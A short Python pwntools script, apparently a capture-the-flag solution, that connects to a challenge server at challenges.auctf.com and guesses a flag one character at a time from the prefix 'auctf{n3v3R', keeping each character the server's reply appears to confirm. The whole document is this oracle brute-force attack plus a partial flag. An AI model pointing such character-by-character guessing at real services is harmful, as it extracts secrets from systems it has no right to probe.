from pwn import *
from string import *

characters=printable

r = remote('challenges.auctf.com',30030 )

st="auctf{n3v3R"

while(True):
    for ch in characters:
        r.send(st+ch+"\n")
        data = r.recv()
        if "b''\n" in data:
            # print "maybe"
            st=st+ch
            break
        print ch
    print(st)